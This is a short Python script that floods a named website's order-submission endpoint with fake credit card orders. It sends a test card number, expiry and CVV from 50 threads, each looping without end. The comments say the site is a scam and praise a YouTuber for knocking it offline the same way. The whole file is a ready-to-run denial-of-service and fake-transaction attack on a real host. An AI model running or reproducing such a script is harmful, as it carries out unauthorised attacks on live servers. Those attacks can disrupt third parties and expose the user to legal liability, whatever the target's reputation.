import requests
import threading

#ACTUAL SCAM SITE
# http://luckypro12.com/PS5/checkout.php?orderID=A58C946EE&AFFID=&C1=&C2=&C3=&TRANSID=&C2SUB3=&C2USERID=&C2136687

#What F12 sez the request url is
url = 'http://luckypro12.com/PS5/includes/submit_order_limelight.php'

data = {
    #credit card number that is an example of the Luhn Algorithm
    'cc_number': '4007000000027',
    'cc_expmonth': '08',
    'cc_expyear': '21',
    'cc_ccv': '234',


    #Engineerman caused thousands of dollars in debt within seconds causing the scammer to 404 error the site
    #thus the rest of the information required on the form to complete transaction are no longer in the F12
    #below are examples that can be expected to see in F12
    'billing_country': 'US',
    'order': '234',
}


def do_request():
    while True:
        response = requests.post (url, data=data).text
        print(response) 

#holy shiz. threads are the gateway to pain    
threads = []

for i in range (50):
        t = threading.Thread(target=do_request)
        t.daemon = True
        threads.append (t)

for i in range (50):
    threads[i].start()

for i in range (50):
    threads[i].join()